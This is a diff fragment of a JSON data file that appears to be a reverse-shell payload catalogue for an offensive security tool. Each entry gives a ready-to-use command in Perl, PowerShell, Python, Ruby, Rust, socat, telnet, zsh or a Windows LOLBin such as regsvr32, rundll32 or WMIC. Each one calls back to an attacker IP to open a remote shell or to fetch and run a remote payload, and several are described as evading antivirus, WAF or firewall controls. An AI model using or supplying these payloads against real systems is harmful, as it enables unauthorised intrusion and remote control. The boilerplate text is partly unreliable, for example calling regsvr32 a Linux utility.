+    "command": "perl -e 'use Socket;$i=\"<IP>\";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+    "description": "<p>A robust Perl reverse shell. Reliable on older Unix/Solaris/Linux distributions where Python is absent but Perl is heavily integrated.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Perl</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:perl",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "6da92d42-0bf7-5db6-821a-c821576d313d",
+    "label": "PowerShell IEX (Invoke-Expression) Cradle",
+    "command": "powershell -exec bypass -c \"IEX(New-Object Net.WebClient).downloadString('http://<IP>/Invoke-PowerShellTcp.ps1')\"",
+    "description": "<p>Pulls a larger shell script (like Nishang's Invoke-PowerShellTcp) directly into memory from a hosted web server, avoiding writing raw `.ps1` files to disk.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#PowerShell</span> (Typically a standard utility on windows targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:windows",
+      "tool:powershell",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "6e89c67c-3e35-5151-8974-81e5c1e97576",
+    "label": "PowerShell TCPClient Shell",
+    "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
+    "description": "<p>An in-memory PowerShell reverse shell that instantiates a .NET TCPClient. The industry standard baseline payload for Windows targets.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#PowerShell</span> (Typically a standard utility on windows targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:windows",
+      "tool:powershell",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "e54f8314-c622-5103-bce6-58bed04c1018",
+    "label": "Python 3 Linux PTY Shell",
+    "command": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"<IP>\",<PORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
+    "description": "<p>A pure Python reverse shell that directly spawns a pseudo-terminal (PTY) without relying on `/bin/sh` piping, resulting in a stable shell.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Python</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:python",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "6077889c-243a-5db1-b972-dc194a1ec5d9",
+    "label": "Python/Bash TTY Upgrade",
+    "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Now background the shell: Ctrl+Z\nstty raw -echo; fg; reset\nexport TERM=xterm-256color",
+    "description": "<p>Not a shell itself, but the mandatory follow-up action. Elevates a \"dumb\" reverse shell into a fully interactive TTY, allowing the use of `su`, text editors (vim), and handling Ctrl+C accurately.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Python/Bash</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:python/bash",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "d73b4351-e381-50df-96f3-6e94306957ba",
+    "label": "Python IPv6 Shell",
+    "command": "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"<IPv6>\",<PORT>,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
+    "description": "<p>A Python shell specifying `AF_INET6` to route the callback over an IPv6 network, effectively bypassing many legacy IPv4-only firewall rules.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Python</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:python",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "52c893b1-a877-5e59-b2b2-1f7b3ead1c4e",
+    "label": "Python Shortened (WAF Bypass)",
+    "command": "python -c 'a=__import__;c=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;s=c.socket(c.AF_INET,c.SOCK_STREAM);s.connect((\"<IP>\",<PORT>));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'",
+    "description": "<p>Compresses the Python payload by aliasing `__import__` to remove spaces and newline characters, evading basic regex WAF filters looking for `import socket`.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Python</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:python",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "acc4cdf9-868e-5099-b489-491e96bda3e6",
+    "label": "Python Subprocess Shell",
+    "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP>\",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+    "description": "<p>Utilizes the `subprocess` module rather than `pty.spawn`, providing better cross-platform compatibility where the `pty` module is not natively available.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Python</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:python",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "ddc6c52e-a46f-5bf0-8d0d-79db75fa25ed",
+    "label": "Regsvr32 Squiblydoo Bypass",
+    "command": "regsvr32 /u /n /s /i:http://<IP>/payload.sct scrobj.dll",
+    "description": "<p>A classic LOLBIN. `regsvr32` securely downloads, registers, and executes the `.sct` scriptlet in memory, completely evading simple static antivirus scans.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Regsvr32</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:regsvr32",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "2d2c1854-e7fa-50ac-8638-4109f93bc4fe",
+    "label": "Ruby Socket Shell",
+    "command": "ruby -rsocket -e'f=TCPSocket.open(\"<IP>\",<PORT>).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+    "description": "<p>A compact Ruby socket connection that redirects `/bin/sh` using `sprintf`. Valuable on Ruby on Rails application servers.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Ruby</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:ruby",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "ba534737-c23e-5469-88be-5cacba55bbd2",
+    "label": "Rundll32.exe Scriptlet Execution",
+    "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";o=GetObject(\"script:http://<IP>/payload.sct\");window.close();",
+    "description": "<p>Hijacks the signed Windows binary `rundll32.exe` to execute a remote scriptlet, bypassing endpoint protections.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Rundll32.exe</span> (Typically a standard utility on windows targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:windows",
+      "tool:rundll32.exe",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "6115b2a7-96e4-51d9-8476-03364f836d39",
+    "label": "Rust Compiled Shell",
+    "command": "use std::net::TcpStream; use std::os::unix::io::{AsRawFd, FromRawFd}; use std::process::{Command, Stdio}; fn main() { let s = TcpStream::connect(\"<IP>:<PORT>\").unwrap(); let fd = s.as_raw_fd(); Command::new(\"/bin/sh\").arg(\"-i\").stdin(unsafe { Stdio::from_raw_fd(fd) }).stdout(unsafe { Stdio::from_raw_fd(fd) }).stderr(unsafe { Stdio::from_raw_fd(fd) }).spawn().unwrap().wait().unwrap(); }",
+    "description": "<p>A lightning-fast, highly memory-safe Rust payload. Requires the Rust compiler to build ahead of time, dropping a raw binary. Evades almost all heuristic pattern blocks.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Rust</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:rust",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "b7d68ef8-d9c1-5d86-b586-44f78766ea04",
+    "label": "Socat Interactive Shell",
+    "command": "# Target\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>",
+    "description": "<p>Socat provides a fully interactive TTY native reverse shell out of the box, gracefully handling SIGINT (Ctrl+C), history, and tab completion without needing standard upgrading methods.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Socat</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:socat",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "5d0a5c03-8f69-546c-b4df-dfa9cba7cd67",
+    "label": "Telnet Dual-Pipe Shell",
+    "command": "telnet <IP> <PORT1> | /bin/sh | telnet <IP> <PORT2>",
+    "description": "<p>Uses two separate Telnet connections (one for stdin, one for stdout) to establish a shell entirely without Netcat or scripting languages.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Telnet</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:telnet",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "33abb1d0-b98c-528c-8a89-16f36bbdc542",
+    "label": "WMIC Remote XSL Execution",
+    "command": "wmic os get /format:\"http://<IP>/payload.xsl\"",
+    "description": "<p>Abuses Windows Management Instrumentation (`wmic.exe`) to fetch and execute a malicious `Extensible Stylesheet Language` (XSL) file containing JScript.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#WMIC</span> (Typically a standard utility on windows targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:windows",
+      "tool:wmic",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "954fcfc0-4801-5ec4-b9c0-575cb1a748df",
+    "label": "Xterm Reverse Display Shell",
+    "command": "xterm -display <IP>:1",
+    "description": "<p>Very simple shell. The server throws a graphical UI instance over the raw network to a listening Xnest server, completely subverting standard TCP blocking behaviors.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Xterm</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:xterm",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "f8198e50-071c-5521-9838-d596ead7ce4b",
+    "label": "Zsh TCP Shell",
+    "command": "zsh -c 'zmodload zsh/net/tcp; ztcp <IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'",
+    "description": "<p>Equivalent to the Bash TCP shell but utilizing Zsh's native networking modules. Valuable on macOS and modern Linux distributions where `zsh` is default.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Zsh</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:zsh",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  }
+]
